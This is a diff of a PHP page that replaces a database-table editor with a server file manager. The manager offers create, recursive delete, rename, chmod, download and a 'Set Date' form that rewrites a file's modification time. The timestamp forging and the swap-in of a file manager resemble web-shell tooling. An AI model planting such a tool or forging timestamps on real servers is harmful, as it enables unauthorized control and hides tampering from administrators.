-            <label>New Name: <input type="text" name="new_column_name" placeholder="Leave blank for no change"></label>
-            <label>New Data Type:
-                <select name="new_data_type" required>
-                    <option value="VARCHAR(255)">VARCHAR(255)</option>
-                    <option value="INT">INT</option>
-                    <option value="TEXT">TEXT</option>
-                    <option value="DATE">DATE</option>
-                    <option value="BOOLEAN">BOOLEAN</option>
-                    <option value="FLOAT">FLOAT</option>
-                </select>
-            </label>
-            <button type="submit">Modify Column</button>
+        <form method="post">
+            <input type="hidden" name="action" value="create_file">
+            <input type="text" name="name" placeholder="newfile.txt" required>
+            <button class="btn gray small" type="submit">Create File</button>
         </form>
-    </div>
+        <form method="post">
+            <input type="hidden" name="action" value="create_folder">
+            <input type="text" name="name" placeholder="New Folder" required>
+            <button class="btn gray small" type="submit">Create Folder</button>
+        </form>
+        <form method="post" action="?logout=1" onsubmit="return confirm(\'Logout?\');">
+            <button class="btn gray small" type="submit">Logout</button>
+        </form>
+      </div>';
 
-  <table>
-    <tr>
-      <?php foreach ($columnsResult as $col): ?>
-        <th><?php echo htmlspecialchars($col['Field']); ?></th>
-      <?php endforeach; ?>
-      <th>Action</th>
-    </tr>
+echo '<table><thead><tr>
+        <th>Name</th><th>Modified</th><th>Permissions</th><th>Actions</th>
+      </tr></thead><tbody>';
 
-    <?php // Display existing rows
-    foreach ($rows as $row): ?>
-    <tr>
-      <form method="post" action="" style="display: contents;">
-        <input type="hidden" name="action" value="update">
-        <?php foreach ($columnsResult as $col): ?>
-          <td>
-<input type="text" name="data[<?php echo htmlspecialchars($col['Field']); ?>]" value="<?php echo htmlspecialchars($row[$col['Field']] ?? ''); ?>"></td>
-        <?php endforeach; ?>
-        <td class="actions-cell">
-          <input type="hidden" name="table" value="<?php echo htmlspecialchars($tableName); ?>">
-          <input type="hidden" name="primary_key" value="<?php echo htmlspecialchars($primaryKey); ?>">
-          <input type="hidden" name="primary_value" value="<?php echo htmlspecialchars($row[$primaryKey]); ?>">
-          <button type="submit">Save</button>
-      </form>
-      <form method="post" action="" style="display: contents;">
-          <input type="hidden" name="action" value="delete">
-          <input type="hidden" name="table" value="<?php echo htmlspecialchars($tableName); ?>">
-          <input type="hidden" name="primary_key" value="<?php echo htmlspecialchars($primaryKey); ?>">
-          <input type="hidden" name="primary_value" value="<?php echo htmlspecialchars($row[$primaryKey]); ?>">
-          <button type="submit" class="delete-btn" onclick="return confirm('Are you sure you want to delete this row?');">Delete</button>
-      </form>
-        </td>
-    </tr>
-    <?php endforeach; ?>
+foreach ($listed as $name) {
+    $abs = $CURRENT . '/' . $name;
+    $rel = ($reqPath === '' ? $name : $reqPath . '/' . $name);
+    $isDir = is_dir($abs);
+    $icon = $isDir ? '&#128193;' : '&#128196;';
+    $mtime = @filemtime($abs);
+    $mtimeStr = $mtime ? date('Y-m-d H:i:s', $mtime) : '-';
+    $perms = fm_perms($abs);
 
-    <?php // Display "Add New" form ?>
-    <tr class="add-row">
-      <form method="post" action="">
-        <input type="hidden" name="action" value="insert">
-        <input type="hidden" name="table" value="<?php echo htmlspecialchars($tableName); ?>">
-        <?php foreach ($columnsResult as $col): ?>
-        <td>
-          <?php $isDisabled = ($col['Field'] === $primaryKey && $isAutoIncrement); ?>
-          <input type="text" name="data[<?php echo htmlspecialchars($col['Field']); ?>]" placeholder="<?php echo htmlspecialchars($col['Field']); ?>" <?php if ($isDisabled) echo 'disabled title="Auto-Increment"'; ?>>
-        </td>
-        <?php endforeach; ?>
-        <td><button type="submit">Add Row</button></td>
-      </form>
-    </tr>
-  </table>
+    echo '<tr><td class="name"><span class="icon">'.$icon.'</span>'.
+         '<a href="?path='.urlencode($rel).'"><b>'.htmlspecialchars($name).'</b></a>'.
+         '</td><td class="meta">'.$mtimeStr.'</td><td class="meta">'.$perms.'</td><td>';
 
-  <div class="pagination">
-    <?php for ($i = 1; $i <= $totalPages; $i++): ?>
-      <a class="<?php if ($i == $page) echo 'active'; ?>" href="?page=<?php echo $i; ?>"><?php echo $i; ?></a>
-    <?php endfor; ?>
-  </div>
-<?php endforeach; ?>
-</body>
-</html>
+    echo '<form method="post" onsubmit="return confirm(\'Delete '.htmlspecialchars($name).'?\');">
+            <input type="hidden" name="action" value="delete">
+            <input type="hidden" name="path" value="'.htmlspecialchars($rel).'">
+            <button class="btn grey small danger" type="submit">Delete</button>
+          </form>';
+
+    echo '<form method="post">
+            <input type="hidden" name="action" value="rename">
+            <input type="hidden" name="path" value="'.htmlspecialchars($rel).'">
+            <input type="text" name="new_name" placeholder="Rename to" required>
+            <button class="btn gray small" type="submit">Rename</button>
+          </form>';
+
+    // NEW: chmod form
+    echo '<form method="post">
+            <input type="hidden" name="action" value="chmod">
+            <input type="hidden" name="path" value="'.htmlspecialchars($rel).'">
+            <input type="text" name="new_perms" placeholder="'.$perms.'" pattern="[0-7]{3,4}" required>
+            <button class="btn gray small" type="submit">Chmod</button>
+          </form>';
+
+   if (!$isDir) {
+    echo '<form method="post">
+            <input type="hidden" name="action" value="download">
+            <input type="hidden" name="path" value="'.htmlspecialchars($rel).'">
+            <button class="btn small gray" type="submit">Download</button>
+          </form>';
+}
+
+
+echo '<form method="post" style="margin-top:6px">
+        <input type="hidden" name="action" value="change_date">
+        <input type="hidden" name="path" value="'.htmlspecialchars($rel).'">
+        <input type="datetime-local" name="new_mtime" value="'.htmlspecialchars($mtime? date('Y-m-d\TH:i:s', $mtime) : '').'" step="1">
+        <button class="btn gray small" type="submit">Set Date</button>
+      </form>';
+
+    echo '</td></tr>';
+}
+
+echo '</tbody></table>';
+
+echo '</div></body></html>';
+
+function fm_delete_dir(string $dir): bool {
+    if (!is_dir($dir)) return false;
+    foreach (array_diff(scandir($dir), ['.','..']) as $f) {
+        $p = "$dir/$f";
+        if (is_dir($p)) fm_delete_dir($p); else @unlink($p);
+    }
+    return @rmdir($dir);
+}
+
+function fm_breadcrumb(string $relPath): string {
+    $parts = array_filter(explode('/', $relPath));
+    $acc = '';
+    $html = '<div class="breadcrumb"><a href="?path=">ROOTT</a>';
+    foreach ($parts as $p) {
+        $acc .= ($acc ? '/' : '') . $p;
+        $html .= ' / <a href="?path=' . urlencode($acc) . '"><b>' . htmlspecialchars($p) . '</b></a>';
+    }
+    $html .= '</div>';
+    return $html;
+}
